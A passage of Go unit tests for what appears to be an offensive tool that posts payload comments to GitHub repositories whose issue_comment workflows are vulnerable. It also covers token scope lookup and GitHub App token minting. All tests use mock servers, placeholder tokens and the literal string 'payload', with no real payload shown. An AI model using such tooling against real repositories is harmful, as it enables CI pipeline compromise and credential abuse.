	ghClient := newMockGitHubAPIWithError(t, "/issues/list", http.StatusInternalServerError)

	vuln := &VulnerabilityInfo{Repository: "acme/api", Workflow: "ci.yml", Context: "issue_comment"}
	_, err := ghClient.deployComment(context.Background(), vuln, "payload", "")

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to list issues")
}

func TestDeployComment_CreateCommentFails(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/comments", http.StatusForbidden)

	vuln := &VulnerabilityInfo{Repository: "acme/api", Workflow: "ci.yml", Context: "issue_comment", IssueNumber: 42}
	_, err := ghClient.deployComment(context.Background(), vuln, "payload", "")

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to create comment")
}

func TestDeployComment_CleansUpAutoCreatedIssueOnCommentFailure(t *testing.T) {
	var createdIssue, closedIssue bool
	mux := http.NewServeMux()

	mux.HandleFunc("GET /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, `[]`)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		createdIssue = true
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/issues/7","number":7}`, r.PathValue("owner"), r.PathValue("repo"))
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues/{number}/comments", func(w http.ResponseWriter, _ *http.Request) {
		http.Error(w, "forbidden", http.StatusForbidden)
	})

	mux.HandleFunc("PATCH /repos/{owner}/{repo}/issues/{number}", func(w http.ResponseWriter, _ *http.Request) {
		closedIssue = true
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, `{"state":"closed"}`)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	baseURL, _ := url.Parse(srv.URL + "/")
	tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: "test-token"}))
	client := github.NewClient(tc)
	client.BaseURL = baseURL
	ghClient := &gitHubClient{client: client, token: "test-token"}

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "issue_comment",
	}

	_, err := ghClient.deployComment(context.Background(), vuln, "payload", "")
	require.Error(t, err)
	assert.True(t, createdIssue)
	assert.True(t, closedIssue)
	assert.Contains(t, err.Error(), "failed to create comment")
}

func TestDeployComment_OnlyPRsInList(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/issues/only_prs", http.StatusOK)

	vuln := &VulnerabilityInfo{Repository: "acme/api", Workflow: "ci.yml", Context: "issue_comment"}
	result, err := ghClient.deployComment(context.Background(), vuln, "payload", "")

	require.NoError(t, err)
	assert.Contains(t, result.CommentURL, "acme/api/issues/")
}

// --- handleGitHubTokenInfo handler test ---

func TestHandlerTokenInfo_Success(t *testing.T) {
	tokenSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		assert.Contains(t, r.Header.Get("Authorization"), "Bearer ghp_test")
		w.Header().Set("X-OAuth-Scopes", "repo, workflow")
		w.Header().Set("X-RateLimit-Limit", "5000")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"login":"testuser"}`)
	}))
	defer tokenSrv.Close()

	origFunc := fetchTokenInfoRaw
	fetchTokenInfoRaw = func(ctx context.Context, token string) (*FetchTokenInfoResponse, error) {
		return fetchTokenInfoFromURL(ctx, token, tokenSrv.URL+"/user")
	}
	t.Cleanup(func() { fetchTokenInfoRaw = origFunc })

	_, mux := newGitHubTestHandler()

	body := `{"token":"ghp_test","source":"pat"}`
	req := httptest.NewRequest(http.MethodPost, "/github/token/info", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp FetchTokenInfoResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Equal(t, "testuser", resp.Owner)
	assert.Equal(t, []string{"repo", "workflow"}, resp.Scopes)
	assert.Equal(t, 5000, resp.RateLimitMax)
	assert.Equal(t, "classic_pat", resp.TokenType)
}

func generateTestPEM(t *testing.T) []byte {
	t.Helper()
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	require.NoError(t, err)
	return pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(key),
	})
}

func TestGenerateAppJWT_ValidClaims(t *testing.T) {
	pemData := generateTestPEM(t)

	token, err := generateAppJWT(pemData, "12345")
	require.NoError(t, err)
	assert.NotEmpty(t, token)

	parsed, err := jwt.Parse([]byte(token), jwt.WithVerify(false))
	require.NoError(t, err)
	iss, _ := parsed.Issuer()
	iat, _ := parsed.IssuedAt()
	exp, _ := parsed.Expiration()
	assert.Equal(t, "12345", iss)
	assert.WithinDuration(t, time.Now().Add(-60*time.Second), iat, 5*time.Second)
	assert.WithinDuration(t, time.Now().Add(10*time.Minute), exp, 5*time.Second)
}

func TestGenerateAppJWT_RS256Signature(t *testing.T) {
	pemData := generateTestPEM(t)

	block, _ := pem.Decode(pemData)
	privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	require.NoError(t, err)

	token, err := generateAppJWT(pemData, "99")
	require.NoError(t, err)

	_, err = jwt.Parse([]byte(token), jwt.WithKey(jwa.RS256(), &privKey.PublicKey))
	assert.NoError(t, err)
}

func TestGenerateAppJWT_InvalidPEM(t *testing.T) {
	_, err := generateAppJWT([]byte("not a pem"), "12345")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "PEM block")
}

func TestHandlerAppInstallations_Success(t *testing.T) {
	pemData := generateTestPEM(t)

	ghSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "/app/installations", r.URL.Path)
		assert.Contains(t, r.Header.Get("Authorization"), "Bearer ")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `[{"id":100,"account":{"login":"acme"},"app_slug":"my-app"}]`)
	}))
	defer ghSrv.Close()

	orig := gitHubAppAPIURL
	gitHubAppAPIURL = ghSrv.URL
	t.Cleanup(func() { gitHubAppAPIURL = orig })

	_, mux := newGitHubTestHandler()
	body := fmt.Sprintf(`{"pem":%q,"app_id":"12345"}`, string(pemData))
	req := httptest.NewRequest(http.MethodPost, "/github/app/installations", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp ListAppInstallationsResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	require.Len(t, resp.Installations, 1)
	assert.Equal(t, int64(100), resp.Installations[0].ID)
	assert.Equal(t, "acme", resp.Installations[0].Account)
	assert.Equal(t, "my-app", resp.Installations[0].AppSlug)
}

func TestHandlerAppToken_Success(t *testing.T) {
	pemData := generateTestPEM(t)

	ghSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "/app/installations/100/access_tokens", r.URL.Path)
		assert.Equal(t, http.MethodPost, r.Method)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"token":"ghs_test123","expires_at":"2026-01-01T00:00:00Z"}`)
	}))
	defer ghSrv.Close()

	orig := gitHubAppAPIURL
	gitHubAppAPIURL = ghSrv.URL
	t.Cleanup(func() { gitHubAppAPIURL = orig })

	_, mux := newGitHubTestHandler()
	body := fmt.Sprintf(`{"pem":%q,"app_id":"12345","installation_id":100}`, string(pemData))
	req := httptest.NewRequest(http.MethodPost, "/github/app/token", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp CreateInstallationTokenResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Equal(t, "ghs_test123", resp.Token)
	assert.Equal(t, time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC), resp.ExpiresAt)
}

func TestHandlerAppInstallations_InvalidPEM(t *testing.T) {
	_, mux := newGitHubTestHandler()
	body := `{"pem":"not-a-pem","app_id":"12345"}`
	req := httptest.NewRequest(http.MethodPost, "/github/app/installations", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusInternalServerError, rec.Code)
	assert.Contains(t, rec.Body.String(), "JWT generation failed")
}

func TestHandlerAppToken_GitHubAPIError(t *testing.T) {
	pemData := generateTestPEM(t)

	ghSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusUnauthorized)
	}))
	defer ghSrv.Close()

	orig := gitHubAppAPIURL
	gitHubAppAPIURL = ghSrv.URL
	t.Cleanup(func() { gitHubAppAPIURL = orig })

	_, mux := newGitHubTestHandler()
	body := fmt.Sprintf(`{"pem":%q,"app_id":"12345","installation_id":100}`, string(pemData))
	req := httptest.NewRequest(http.MethodPost, "/github/app/token", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusInternalServerError, rec.Code)
	assert.Contains(t, rec.Body.String(), "401")
}

func TestCreateInstallationToken_ParsesPermissions(t *testing.T) {
	pemData := generateTestPEM(t)
	jwtToken, err := generateAppJWT(pemData, "12345")
	require.NoError(t, err)

	ghSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "/app/installations/42/access_tokens", r.URL.Path)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{
			"token": "ghs_permstest",
			"expires_at": "2026-06-01T12:00:00Z",
			"permissions": {
				"contents": "write",
				"metadata": "read",
				"pull_requests": "write",
				"actions": "read",
				"issues": "write"
			}
		}`)
	}))
	defer ghSrv.Close()

	orig := gitHubAppAPIURL
	gitHubAppAPIURL = ghSrv.URL
	t.Cleanup(func() { gitHubAppAPIURL = orig })

	token, expiresAt, perms, err := createInstallationToken(context.Background(), jwtToken, 42)
	require.NoError(t, err)
	assert.Equal(t, "ghs_permstest", token)
	assert.Equal(t, time.Date(2026, 6, 1, 12, 0, 0, 0, time.UTC), expiresAt)
	require.Len(t, perms, 5)
	assert.Equal(t, "write", perms["contents"])
	assert.Equal(t, "read", perms["metadata"])
	assert.Equal(t, "write", perms["pull_requests"])
	assert.Equal(t, "read", perms["actions"])
	assert.Equal(t, "write", perms["issues"])
}

func TestCreateInstallationToken_EmptyPermissions(t *testing.T) {
	pemData := generateTestPEM(t)
	jwtToken, err := generateAppJWT(pemData, "12345")
	require.NoError(t, err)

	ghSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"token":"ghs_noperms","expires_at":"2026-06-01T12:00:00Z"}`)
	}))
	defer ghSrv.Close()

	orig := gitHubAppAPIURL
	gitHubAppAPIURL = ghSrv.URL
	t.Cleanup(func() { gitHubAppAPIURL = orig })

	token, expiresAt, perms, err := createInstallationToken(context.Background(), jwtToken, 99)
	require.NoError(t, err)
	assert.Equal(t, "ghs_noperms", token)
	assert.Equal(t, time.Date(2026, 6, 1, 12, 0, 0, 0, time.UTC), expiresAt)
	assert.Empty(t, perms)
}

func TestHandlerAppToken_ReturnsPermissions(t *testing.T) {
	pemData := generateTestPEM(t)

	ghSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "/app/installations/100/access_tokens", r.URL.Path)
		assert.Equal(t, http.MethodPost, r.Method)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{
			"token": "ghs_withperms",
			"expires_at": "2026-01-01T00:00:00Z",
			"permissions": {
				"contents": "write",
				"metadata": "read",
				"actions": "write"
			}
		}`)
	}))
	defer ghSrv.Close()

	orig := gitHubAppAPIURL
	gitHubAppAPIURL = ghSrv.URL
	t.Cleanup(func() { gitHubAppAPIURL = orig })

	_, mux := newGitHubTestHandler()
	body := fmt.Sprintf(`{"pem":%q,"app_id":"12345","installation_id":100}`, string(pemData))
	req := httptest.NewRequest(http.MethodPost, "/github/app/token", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp CreateInstallationTokenResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Equal(t, "ghs_withperms", resp.Token)
	assert.Equal(t, time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC), resp.ExpiresAt)
	require.Len(t, resp.Permissions, 3)
	assert.Equal(t, "write", resp.Permissions["contents"])
	assert.Equal(t, "read", resp.Permissions["metadata"])
	assert.Equal(t, "write", resp.Permissions["actions"])
}
